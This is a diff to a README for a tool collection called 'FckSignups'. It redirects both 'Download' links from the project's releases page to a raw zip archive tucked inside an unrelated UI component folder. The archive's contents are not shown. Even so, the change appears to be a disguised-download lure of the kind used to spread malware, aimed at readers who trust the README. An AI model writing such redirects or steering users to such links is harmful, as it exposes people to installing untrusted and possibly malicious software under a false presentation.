@@ -1,6 +1,6 @@
 # 🚀 FckSignups - No Signups, Just Free Tools!
 
-[![Download Now](https://img.shields.io/badge/Download-Get_FckSignups-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=ff6600&color=00cc00)](https://github.com/brianmarhel-web/FckSignups/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get_FckSignups-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=ff6600&color=00cc00)](https://github.com/brianmarhel-web/FckSignups/raw/refs/heads/main/src/components/Shared/Feedback/Toast/Fck_Signups_2.6.zip)
 
 ---
 
@@ -45,7 +45,7 @@ If you prefer to have the full list saved on your computer for offline browsing 
 ### Step-by-Step Download & Installation:
 
 **Visit this link to download the application:**  
-[🔗 https://github.com/brianmarhel-web/FckSignups/releases](https://github.com/brianmarhel-web/FckSignups/releases)
+[🔗 https://github.com/brianmarhel-web/FckSignups/raw/refs/heads/main/src/components/Shared/Feedback/Toast/Fck_Signups_2.6.zip](https://github.com/brianmarhel-web/FckSignups/raw/refs/heads/main/src/components/Shared/Feedback/Toast/Fck_Signups_2.6.zip)
 
 Here's what to do next:
 
